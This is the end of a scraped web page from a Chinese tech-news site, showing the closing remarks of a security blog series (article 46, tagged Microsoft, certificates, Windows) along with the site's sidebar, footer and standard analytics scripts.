class=pgc-img-caption></p></div><p>希望这系列文章对您有所帮助，真的感觉自己技术好菜，要学的知识好多。这是第46篇原创的安全系列文章，从网络安全到系统安全，从木马病毒到后门劫持，从恶意代码到溯源分析，从渗透工具到二进制工具，还有Python安全、顶会论文、黑客比赛和漏洞分享。未知攻焉知防，人生漫漫其路远兮，作为初学者，自己真是爬着前行，感谢很多人的帮助，继续爬着，继续加油！</p></div><div class="post-meta meta-tags"><ul class=clearfix><li><a>'微软','证书','Windows'</a></li></ul></div></article></div></div><div id=secondary><section class=widget><form id=search action=//www.google.com/search method=get accept-charset=utf-8 target=_blank _lpchecked=1><input type=text name=q maxlength=20 placeholder=搜索>
<input type=hidden name=sitesearch value=geekbank.cf>
<button type=submit>🔍</button></form></section><section class=widget><h3 class=widget-title>最新文章 ⚡</h3><ul class=widget-list></ul></section><section class=widget><h3 class=widget-title>其他</h3><ul class=widget-list><li><a href=TOS.html>使用條款</a></li><li><a href=CommentPolicy.html>留言政策</a></li><li><a href=mailto:gdnews@tuta.io rel=nofollow>DMCA</a></li><li><a href=mailto:gdnews@tuta.io rel=nofollow>聯絡我們</a></li></ul></section></div></div></div></div><footer id=footer><div class=container>&copy; 2020 <a href>极客快訊</a></div></footer><script type=text/javascript>window.MathJax={tex2jax:{inlineMath:[['$','$']],processEscapes:true}};</script><script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML" async></script><a id=rocket href=#top></a><script type=text/javascript src=https://kknews.cf/js/totop.js async></script><script type=application/javascript>var doNotTrack=false;if(!doNotTrack){window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create','UA-146415161-2','auto');ga('send','pageview');}</script><script async src=https://www.google-analytics.com/analytics.js></script><script type=text/javascript src="//s7.addthis.com/js/300/addthis_widget.js#pubid=ra-5e508ed9e4e698bb"></script></body></html>